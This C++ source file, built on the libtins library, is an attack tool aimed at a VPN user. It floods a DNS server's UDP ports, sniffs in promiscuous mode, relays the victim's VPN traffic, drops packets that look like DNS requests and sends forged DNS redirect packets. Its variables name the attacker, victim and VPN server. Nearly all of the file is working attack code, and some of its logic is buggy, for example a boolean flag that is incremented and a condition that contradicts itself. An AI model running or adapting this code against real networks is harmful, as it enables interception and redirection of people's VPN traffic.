#include <tins/tins.h>
#include <cassert>
#include <iostream>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> /* superset of previous */

#include <string>
#include <unistd.h>
#include <thread>
#include <random>
#include <chrono>

using std::thread;
using std::cout;
using std::string;
using std::vector;
using namespace Tins;


// BEGIN: global variables
string html_response = R"(
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
)";
bool DEBUG=false;

string public_iface;
string attacker_pub_ip;

string victim_ip;
unsigned short victim_port;

// The port for the VPN Server UDP-port shadow (reflection)
string vpn_ip;
unsigned short vpn_port;

// The port for the VPN-stripped TCP-port shadow (reflection)
unsigned short https_port;
unsigned short attacker_port;
volatile bool found_dns_request = false;
volatile int found_dns_request_count = 0;
short victim_vpn_port = 0;
string webdnsserver_ip = "192.168.3.254";
// END: global variables 

void send_udp_packets() {
	PacketSender sender;
	NetworkInterface iface(public_iface);
	while (true) {
		for (short i = 1; i < 65560; i++) {
			if (i != 50515) {
				IP pkt = IP(webdnsserver_ip) / UDP(54, i);
				sender.send(pkt, iface);
			}
		}
	}
}


void send_dns_redirect_packets() {
	PacketSender sender;
	NetworkInterface iface(public_iface);
	while (true) {
		if (found_dns_request) {
			std::cout << "Sending DNS request" << std::endl;
			usleep(40000000);
			IP pkt = IP(webdnsserver_ip) / UDP(53, 50515);
			sender.send(pkt, iface);
		}
	}
}

bool relay_packet(PDU &some_pdu){
	PacketSender sender;
	NetworkInterface iface(public_iface);
	
	unsigned short vport;
	const IP &ip = some_pdu.rfind_pdu<IP>();
	bool relay_packet = true;
#define DNS_MIN_LEN 99
#define DNS_MAX_LEN 115
	if (ip.src_addr() == victim_ip && ip.protocol() ==
			IPPROTO_UDP) {

		const UDP &udp = some_pdu.rfind_pdu<UDP>();
		if (udp.sport() == victim_vpn_port) {
			const RawPDU& raw = udp.rfind_pdu<RawPDU>();
			std::cout << "Received victim packet to vpn server: src="
				<< ip.src_addr() << ":" << udp.sport() 
				<< ", dst=" << ip.dst_addr() << ":"
				<< udp.dport() << "," << ip.tot_len() << std::endl;
			if (DNS_MIN_LEN <= ip.tot_len() && ip.tot_len() < DNS_MAX_LEN) {
				relay_packet = false;
				found_dns_request += 1;
				if (found_dns_request > 4 && !found_dns_request ) {
					found_dns_request = true;
				}
			}
			IP pkt = IP(vpn_ip) /
				UDP(vpn_port, victim_port) / raw;
			sender.send(pkt, iface);
		}
		
	}
	return true;
}

void relay_packet_handler() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	Sniffer sniffer("any", config);
	sniffer.sniff_loop(relay_packet);
}


int main(int argc, char** argv) {
      
	if (argc != 6) {
		cout << "sike wrong number of args ---> (public_iface, attacker_pub_ip, victim_ip, vpn_ip, victim_port)\n";
		return 0;
	}
	public_iface = argv[1];
	attacker_pub_ip = argv[2];

	victim_ip = argv[3]; // dns server IP

	vpn_ip = argv[4]; // dns server IP
	victim_vpn_port = atoi(argv[5]);

	thread udp_packet_thread(send_udp_packets);
	udp_packet_thread.detach();

	thread dns_reroute_thread(send_dns_redirect_packets);
	dns_reroute_thread.detach();

	thread relay_thread(relay_packet_handler);
	relay_thread.join();

	return 0;
}
